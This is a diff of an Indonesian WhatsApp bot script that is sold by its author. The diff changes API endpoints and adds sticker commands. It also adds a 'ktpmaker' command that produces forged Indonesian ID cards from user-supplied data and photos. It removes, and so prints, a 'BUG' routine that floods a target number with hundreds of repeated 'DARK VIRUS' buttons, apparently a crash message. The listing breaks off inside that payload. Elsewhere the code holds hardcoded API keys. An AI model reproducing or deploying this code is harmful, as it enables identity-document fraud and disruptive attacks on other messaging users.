@@ -42,6 +42,8 @@ const { Primbon } = require("scrape-primbon");
 const primbon = new Primbon()
 var Jimp = require('jimp');
 ffmpeg.setFfmpegPath(ffmpegPath);
+const util = require('util')
+const syntaxerror = require('syntax-error')
 
 const Exif = require("./function/set_WM_Sticker")
 const exif = new Exif()
@@ -274,6 +276,7 @@ module.exports = async (conn, msg, m, setting, store) => {
     const q1 = q.split('&')[0];
     const q2 = q.split('&')[1];
     const q3 = q.split('&')[2];
+    const q4 = q.split('&')[3];
 
     const isEmoji = (emo) => {
       let emoji_ranges = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g;
@@ -1200,7 +1203,7 @@ _Admin 2 : 0895-1900-9370_
 
 *SCRIPT BOT 🛒*
 _Rp25.000 - ( Fitur 300+ )_
-_Rp60.000 - ( Fitur 600+ )_
+_Rp55.000 - ( Fitur 500+ )_
 
 *_Ready Nokos Whatsapp +1_*
 *_Harga Murah? Chat Admin_*
@@ -1270,7 +1273,7 @@ _Rp60.000 - ( Fitur 600+ )_
       case 'infogempa':
         fetchJson(`https://saipulanuar.ga/api/info/gempa?apikey=jPHjZpQF`)
           .then(xg => {
-            reply(`*INFO GEMPA*
+            let infgm = `*INFO GEMPA*
 
 *tanggal:* ${xg.result.tanggal}
 *jam:* ${xg.result.jam}
@@ -1282,7 +1285,8 @@ _Rp60.000 - ( Fitur 600+ )_
 *kedalaman:* ${xg.result.kedalaman}
 *wilayah:* ${xg.result.wilayah}
 *potensi:* ${xg.result.potensi}
-*dirasakan:* ${xg.result.dirasakan}`)
+*dirasakan:* ${xg.result.dirasakan}`
+          conn.sendMessage(from, { image: { url: xg.result.shakemap }, caption: infgm }, {quoted:msg})
           })
         break
       case 'wikimedia': {
@@ -1298,36 +1302,78 @@ _Rp60.000 - ( Fitur 600+ )_
           })
       }
         break
-      case 'digital':
       case 'nulis':
-      case 'nulis2':
-      case 'quoteser':
-      case 'quobucin': {
         if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
-        if (!q) return reply(`Contoh:\n${prefix + command} saya bukan wibu`)
+        if (!q1 && !q2 && !q3 && !q4) return reply(`Contoh:\n${prefix + command} Ekuzika&11 Ipa&14&saya bukan wibu`)
+        if (!q1) return reply(`nama lu mana?`)
+        if (!q2) return reply(`lu kelas berapa?`)
+        if (!q3) return reply(`lu absen ke berapa?`)
+        if (!q4) return reply(`apa yang mau lu tulis?`)
         reply(mess.wait)
-        var buc = `https://saipulanuar.ga/api/textmaker/${command}?text=${q}&apikey=jPHjZpQF`
+        try {
+        var buc = `https://oni-chan.my.id/api/Fmake/nulis?nama=${q1}&kelas=${q2}&no=${q3}&text=${q4}&apikey=`
         conn.sendMessage(from, { image: { url: buc }, caption: 'Done!' }, { quoted: msg })
-      }
+      } catch(e) {
+        reply(`mungkin rest-api sedang error`)
+      } 
+        break
+      case 'ktpmaker':
+      case 'makerktp':
+      case 'buatktp':
+      case 'createktp':
+      case 'ktp':
+        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
+        if (!isQuotedImage && !isImage) return reply(`Kirim/reply image dengan caption ${prefix + command} nik&nama&tempat tanggal lahir&jenis kelamin&gol. darah&alamat&rt/rw&kel.&kec.&agama&status&pekerjaan&kewarganegaraan&berlaku hingga&prov.&kab.`)
+        if (!q1 && !q2 && !q3 && !q4 && !q5 && !q6 && !q7 && !q8 && !q9 && !q10 && !q11 && !q12 && !q13 && !q14 && !q15 && !q16) return reply(`Example:\n\n${prefix + command} nik&nama&tempat tanggal lahir&jenis kelamin&gol. darah&alamat&rt/rw&kel.&kec.&agama&status&pekerjaan&kewarganegaraan&berlaku hingga&prov.&kab.\n\n${prefix + command} 012345678910&Ekuzika&JakBar, 1-2-2031&Cowok&abc&di jakbar&09/01&palmerah&Palmerah&Islam rill&pacar nya orang&nonton anime di rumah&Indo Jepang&Kehapus fotonya:v&DKI Jakarta&JakBar`)
+        if (!q1) return reply(`nik lu?`)
+        if (!q2) return reply(`nama lu?`)
+        if (!q3) return reply(`ttg lu?`)
+        if (!q4) return reply(`cwo/cwe?`)
+        if (!q5) return reply(`gol. dar?`)
+        if (!q6) return reply(`alamat?`)
+        if (!q7) return reply(`rt/rw?`)
+        if (!q8) return reply(`kel. ?`)
+        if (!q9) return reply(`kec. ?`)
+        if (!q10) return reply(`agama?`)
+        if (!q11) return reply(`status?`)
+        if (!q12) return reply(`pekerjaan?`)
+        if (!q13) return reply(`warganegara?`)
+        if (!q14) return reply(`berlaku hingga?`)
+        if (!q15) return reply(`prov. ?`)
+        if (!q16) return reply(`kab. ?`)
+        reply(mess.wait)
+        try {
+        let ktpimg = await await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/ktpmaker.jpg`)
+        let buffer_ktp = fs.readFileSync(ktpimg)
+          var randktp = 'sticker/' + getRandom('.png')
+          fs.writeFileSync(`./${randktp}`, buffer_ktp)
+          var { url } = await UploadFileUgu(randktp)
+        let ktpnya = `https://oni-chan.my.id/api/Fmake/ktpmaker?nik=${q1}&nama=${q2}&ttl=${q3}&jk=${q4}&gd=${q5}&almt=${q6}&rtw=${q7}&kel=${q8}&kc=${q9}&agm=${q10}&st=${q11}&krj=${q12}&ngr=${q13}&blk=${q14}&prv=${q15}&kab=${q16}&picturl=${url}&apikey=`
+        conn.sendMessage(from, { image: { url: ktpnya }, caption: 'Nich cok ktp lu' }, {quoted:msg})
+        } catch(e) {
+          reply(`Error massbroo..`)
+        }
         break
       case 'ttp':
         if (!q) return reply(`Example:\n${prefix + command} exz-bot`)
         try {
-        let ttp2pn = `https://api-xcoders.site/api/maker/ttp2?text=${q}&color=black&apikey=w8ztncCG2vJoGuv`
+          let ttp2pn = `https://oni-chan.my.id/api/canvas/ttp?text=${q}&apikey=`
           var opt = { packname: 'GuraBot - MD', author: 'By Ekuzika OfC' }
           conn.sendImageAsSticker(from, ttp2pn, msg, opt)
         } catch (e) {
           reply(`Emror kack`)
         }
         break
-       /*case 'attp':
-        if (!q) return reply(`Example:\n${prefix + command} exz-bot`)
-        xteamapi.API.free.attp(q).then(data => {
-          console.log(data)
-          var opt = { packname: 'GuraBot - MD', author: 'By Ekuzika OfC' }
-          conn.sendImageAsSticker(from, data.result, msg, opt)
-        })
-        break */
+      case 'attp':
+       if (!q) return reply(`Example:\n${prefix + command} exz-bot`)
+        try {
+       let ferd = `https://oni-chan.my.id/api/canvas/attp?text=${q}&apikey=`
+         var opt = { packname: 'GuraBot - MD', author: 'By Ekuzika OfC' }
+         conn.sendImageAsSticker(from, ferd, msg, opt)
+       } catch(e) {
+    reply(`waduh error masbro..`)
+       }
+       break 
       case 'pinterest': case 'pin':
         if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
         if (!q) return reply(`Contoh:\n${prefix + command} loli`)
@@ -1474,25 +1520,28 @@ _Rp60.000 - ( Fitur 600+ )_
           reply('Url yang anda masukan/Rest api mungkin error!')
         }
         break
-      /*case 'mediafire':
+     case 'mediafire':
         if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
         if (!q) return reply('*Contoh:*\n#mediafire https://www.mediafire.com/file/451l493otr6zca4/V4.zip/file')
         let isLinks = q.match(/(?:https?:\/{2})?(?:w{3}\.)?mediafire(?:com)?\.(?:com|be)(?:\/www\?v=|\/)([^\s&]+)/)
         if (!isLinks) return reply('Link yang kamu berikan tidak valid')
         reply('*Mengunduh Media...*')
-        let baby1 = await mediafireDl(`${isLinks}`)
-        if (baby1[0].size.split('MB')[0] >= 50) return reply('File Melebihi Batas ' + util.format(baby1))
+        const { mediafireDl } = require('mfiredlcore-vihangayt')
+        let baby1 = await mediafireDl(`${q}`)
+        console.log(baby1)
+        if (baby1.size.split('MB')[0] >= 50) return reply('File Melebihi Batas ' + util.format(baby1))
         let result4 = `-----[ *MEDIAFIRE DOWNLOADER* ]-----
 
-*Name* : ${baby1[0].nama}
-*Size* : ${baby1[0].size}
-*Type* : ${baby1[0].mime}
+*Name* : ${baby1.name}
+*Size* : ${baby1.size}
+*Type* : ${baby1.mime}
+*Date* : ${baby1.date}
 
 _Wait Mengirim file..._
 `
         reply(result4)
-        conn.sendMessage(from, { document: { url: baby1[0].link }, fileName: baby1[0].nama, mimetype: baby1[0].mime }, { quoted: msg }).catch((err) => reply('Gagal saat mendownload File'))
-        break*/
+        conn.sendMessage(from, { document: { url: baby1.link }, fileName: baby1.name, mimetype: baby1.mime }, { quoted: msg }).catch((err) => reply('Gagal saat mendownload File'))
+        break
       case 'grupbot':
       case 'groupbot':
         if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
@@ -1512,7 +1561,8 @@ ${setting.group.link}`)
 • Room Chat : ( ${db_menfes.length} )`)
         break
       case 'ssweb-pc':
-      case 'ssweb-hp': {
+      case 'ssweb-hp':
+      case 'ssweb': {
         if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
         if (!q) return reply(`Masukan parameter url\n*Contoh:*\n${prefix + command} https://google.com`)
         reply(mess.wait)
@@ -1530,12 +1580,11 @@ ${setting.group.link}`)
       case 'runtime':
       case 'tes':
       case 'ping':
-        if (!isOwner) return reply(mess.OnlyOwner)
-        let neww = performance.now()
-        let oldd = performance.now()
-        let spe = neww - oldd
+        //if (!isOwner) return reply(mess.OnlyOwner)
+        const timestamp = speed()
+        const latensi = speed() - timestamp
         var { upload, download } = await checkBandwidth()
-        reply(`*BOT STATUS*\n× *Speed :* ${spe} milidetik\n× *Runtime :* ${runtime(process.uptime())}\n\n*HOST*\n× *Arch :* ${os.arch()}\n× *CPU :* ${os.cpus()[0].model}${os.cpus().length > 1 ? " (" + os.cpus().length + "x)" : ""}\n× *Platform :* ${os.platform()}\n\n*STATISTIK*\n× *Download :* ${download}\n× *Upload :* ${upload}\n`)
+        reply(`*BOT STATUS*\n× *Speed :* ${latensi.toFixed(4)} Second\n× *Runtime :* ${runtime(process.uptime())}\n\n*HOST*\n× *Arch :* ${os.arch()}\n× *CPU :* ${os.cpus()[0].model}${os.cpus().length > 1 ? " (" + os.cpus().length + "x)" : ""}\n× *Platform :* ${os.platform()}\n\n*STATISTIK*\n× *Download :* ${download}\n× *Upload :* ${upload}\n`)
         break
       case 'rules': {
         if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
@@ -1876,15 +1925,15 @@ _Broadcast › Chat All User_`)
 *Admin2:*
 *Wa.me/6289519009370*
 
-_*Harga Normal :*_ ~Rp70.000~
-*_Harga Promo :_ Rp40.000*
+_*Harga Normal :*_ ~Rp120.000~
+*_Harga Promo :_ Rp55.000*
 
 _Sudah Termasuk Tutorial_
 _Script Sudah Disusun Rapih_
 _Size Script Sudah Ringan_
 _Anti Ngelag - Anti Delay_
 _Anti Spam - Anti Call_
-_Total Fitur 600+_
+_Total Fitur 500+_
 _Topup & Deposit_`
         conn.sendMessage(from, { text: text_buysc }, { quoted: msg })
       }
@@ -3156,21 +3205,21 @@ jumlah spam: ${jumlah_pesan}`)
       // LOGO MAKER
       case 'girlneko': case 'gilrneko':
         if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
-        if (!q1 && !q2) return reply("Masukkan text1&text2\nContoh? #girlneko aku&kamu")
+        if (!q1 && !q2) return reply("Masukkan text\nContoh? #girlneko aku&kamu")
         reply("[❗] SEDANG DIPROSES")
-        conn.sendMessage(from, { image: { url: `https://ziy.herokuapp.com/api/maker/girlneko?text1=${q1}&text2=${q2}&apikey=xZiyy` }, caption: "done!!", mentions: [sender] }, { quoted: msg })
+        conn.sendMessage(from, { image: { url: `https://oni-chan.my.id/api/canvas/nekogirl1?text1=${q1}&text2=${q2}&apikey=` }, caption: "done!!", mentions: [sender] }, { quoted: msg })
         break
       case 'sadboy':
         if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
         if (!q1 && !q2) return reply("Masukkan text1&text2\nContoh? #sadboy aku&kamu")
         reply("[❗] SEDANG DIPROSES")
-        conn.sendMessage(from, { image: { url: `https://ziy.herokuapp.com/api/maker/sadboy?text1=${q1}&text2=${q2}&apikey=xZiyy` }, caption: "done!!", mentions: [sender] }, { quoted: msg })
+        conn.sendMessage(from, { image: { url: `https://oni-chan.my.id/api/canvas/nekosad?text1=${q1}&text2=${q2}&apikey=` }, caption: "done!!", mentions: [sender] }, { quoted: msg })
         break
-      case 'kaneki': case 'rem': case 'lolimaker':
+      case 'kaneki': case 'loliggo': case 'gura':
         if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
         if (!q) return reply(`Masukkan text\nContoh: #${command} bot`)
         reply("[❗] SEDANG DIPROSES")
-        conn.sendMessage(from, { image: { url: `https://ziy.herokuapp.com/api/maker/${command}?nama=${q}&apikey=xZiyy` }, caption: "done!!", mentions: [sender] }, { quoted: msg })
+        conn.sendMessage(from, { image: { url: `https://oni-chan.my.id/api/canvas/${command}?name=${q}&apikey=` }, caption: "done!!", mentions: [sender] }, { quoted: msg })
         break
       case 'waifu': case 'lick': case 'kiss': case 'awoo': case 'hug': case 'cry': case 'cuddle': case 'bully': case 'megumin': case 'shinobu': case 'neko': case 'slap': case 'wink': case 'dance': case 'poke': case 'glomp': case 'bite': case 'nom': case 'handhold': case 'highfive': case 'wave': case 'smile': case 'yeet': case 'bonk': case 'smug': case 'pat':
         if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
@@ -3181,16 +3230,126 @@ jumlah spam: ${jumlah_pesan}`)
         })
         break
       case 'dadu':
-      case 'patrick':
-      case 'amongus':
-      case 'gawrgura':
-      case 'anjing':
-      case 'bucinstick': {
+      case 'gawrgura': {
         if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
         reply(mess.wait)
-        let buffer = `https://api.lolhuman.xyz/api/sticker/${command}?apikey=${setting.api_lolkey}`
+        let buffer = `https://api.lolhuman.xyz/api/sticker/${command}?apikey=AryaXyz`
         conn.sendMessage(from, { sticker: { url: buffer }, mimetype: 'image/webp' }, { quoted: msg })
       }
+        break
+        case 'bucinsticker':
+      case 'bucinstiker':
+      case 'bucinstick':
+      case 'bucinstik':
+        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
+        reply(mess.wait)
+        try {
+        var xa = require('xfarr-api');
+        const bucin = await xa.search.stickersearch('bucin')
+          console.log(bucin)
+          if (bucin.status != 200) return reply(`Sticker tidak ditemukan`)
+         let bucins = bucin.sticker_url[Math.floor(Math.random() * bucin.sticker_url.length)]
+        var opt = { packname: 'GuraBot - MD', author: 'By Ekuzika OfC' }
+          conn.sendImageAsSticker(from, bucins, msg, opt)
+          } catch(e) {
+          console.log(e)
+    reply(`Waduh error masbroo..`)
+        }
+        break
+      case 'stickerpatrick':
+      case 'stikerpatrick':
+      case 'stickerpatrik':
+      case 'stikerpatrik':
+      case 'spatrick':
+      case 'spatrik':
+      case 'patrick':
+      case 'patrik':
+        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
+        reply(mess.wait)
+        try  {
+        var xa = require('xfarr-api');
+        const patrick = await xa.search.stickersearch('patrick')
+          console.log(patrick)
+        if (patrick.status != 200) return reply(`Sticker tidak ditemukan`)
+       let patricks = patrick.sticker_url[Math.floor(Math.random() * patrick.sticker_url.length)]
+        var opt = { packname: 'GuraBot - MD', author: 'By Ekuzika OfC' }
+        conn.sendImageAsSticker(from, patricks, msg, opt)
+      } catch(e) {
+          console.log(e)
+    reply(`Waduh error masbroo..`)
+        }
+        break
+      case 'spongebobsticker':
+      case 'spongebobstiker':
+      case 'spongebob':
+      case 'spongbob':
+        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
+        reply(mess.wait)
+        try {
+        var xa = require('xfarr-api');
+        const spong = await xa.search.stickersearch('spongebob squarepants')
+        console.log(spong)
+          if (spong.status != 200) return reply(`Sticker tidak ditemukan`)
+        let spongs = spong.sticker_url[Math.floor(Math.random() * spong.sticker_url.length)]
+        var opt = { packname: 'GuraBot - MD', author: 'By Ekuzika OfC' }
+        conn.sendImageAsSticker(from, spongs, msg, opt)
+      } catch(e) {
+          console.log(e)
+    reply(`Waduh error masbroo..`)
+        }
+        break
+case 'stickeranjing':
+      case 'stikeranjing':
+      case 'anjing':
+        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
+        reply(mess.wait)
+        try {
+        var xa = require('xfarr-api');
+        const anjnn = await xa.search.stickersearch('anjing')
+        console.log(anjnn)
+          if (anjnn.status != 200) return reply(`Sticker tidak ditemukan`)
+        let anj = anjnn.sticker_url[Math.floor(Math.random() * anjnn.sticker_url.length)]
+        var opt = { packname: 'GuraBot - MD', author: 'By Ekuzika OfC' }
+        conn.sendImageAsSticker(from, anj, msg, opt)
+      } catch(e) {
+          console.log(e)
+    reply(`Waduh error masbroo..`)
+        }
+        break
+      case 'stickersearch':
+      case 'stikersearch':
+      case 'stsearch':
+        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
+        if (!q) return reply(`Example:\n${prefix + command} patrick`)
+        reply(mess.wait)
+        try {
+        var xa = require('xfarr-api');
+        const ssti = await xa.search.stickersearch(q)
+        console.log(ssti)
+          if (ssti.status != 200) return reply(`Sticker tidak ditemukan`)
+        let stis = ssti.sticker_url[Math.floor(Math.random() * ssti.sticker_url.length)]
+        var opt = { packname: 'GuraBot - MD', author: 'By Ekuzika OfC' }
+        conn.sendImageAsSticker(from, stis, msg, opt)
+      } catch(e) {
+          console.log(e)
+    reply(`Waduh error masbroo..`)
+        }
+        break
+      case 'amongus':
+        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
+        reply(mess.wait)
+        try {
+        var xa = require('xfarr-api');
+        const among = await xa.search.stickersearch('amongus')
+        console.log(among)
+          if (among.status != 200) return reply(`Sticker tidak ditemukan`)
+        let amngus = among.sticker_url[Math.floor(Math.random() * among.sticker_url.length)]
+        var opt = { packname: 'GuraBot - MD', author: 'By Ekuzika OfC' }
+        conn.sendImageAsSticker(from, amngus, msg, opt)
+      } catch(e) {
+          console.log(e)
+    reply(`Waduh error masbroo..`)
+        }
         break
       // PRIMBON
       case 'ramalanjodoh': case 'ramaljodoh': {
@@ -3552,7 +3711,6 @@ jumlah spam: ${jumlah_pesan}`)
         break
 
       // Random image
-      case 'waifu':
       case 'loli':
       case 'husbu':
       case 'milf':
@@ -3927,12 +4085,6 @@ jumlah spam: ${jumlah_pesan}`)
         conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
       }
         break
-      case 'yuri':
-        if (cekUser("id", sender) == null) return reply(mess.OnlyPrem)
-        let cndn = await fetchJson(`https://raw.githubusercontent.com/jepribarus/JB-Api/main/nsfw/yuri.json`)
-        let randomm = cndn[Math.floor(Math.random() * cndn.length)]
-        conn.sendMessage(m.chat, { image: { url: randomm }, caption: `Nih Kak` }, { quoted: msg })
-        break
       case 'jadibot': {
         if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
         if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
@@ -3966,28 +4118,6 @@ jumlah spam: ${jumlah_pesan}`)
           texoy += `Acara :${i.event}\n\n`
         }
         reply(texoy)
-      }
-        break
-      case 'gempa':
-        let gempaaa = await gempa()
-        let gempanyy = '*INFO GEMPA*\n'
-        for (let i of gempaaa) {
-          gempanyy += `Tanggal : ${i.date}\nKordinat : ${i.locate}\nMagnitude :${i.magnitude}\nLokasi ${i.location}\nDaerah bahaya :${i.warning}\n\n`
-        }
-        reply(gempanyy)
-        break
-      case 'gempanow': {
-        let gemp = await gempaNow()
-        let texih = 'GEMPA-NOW\n\n'
-        for (let i of gemp) {
-          texih += `Tanggal : ${i.date}
-latitude : ${i.latitude} 
-longitude : ${i.longitude} 
-Magnitude :${i.magnitude}
-Lokasi ${i.location}
-Kedalaman :${i.depth}\n\n`
-        }
-        reply(texih)
       }
         break
       case 'bioskopnow': {
@@ -4033,786 +4163,6 @@ Kedalaman :${i.depth}\n\n`
           conn.sendMessage(nomr, {
             text: 'BUG BY ⚠️ 𝘌𝘬𝘶𝘻𝘪𝘬𝘢 𝘖𝘧𝘊 ⚠️',
             templateButtons: [
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
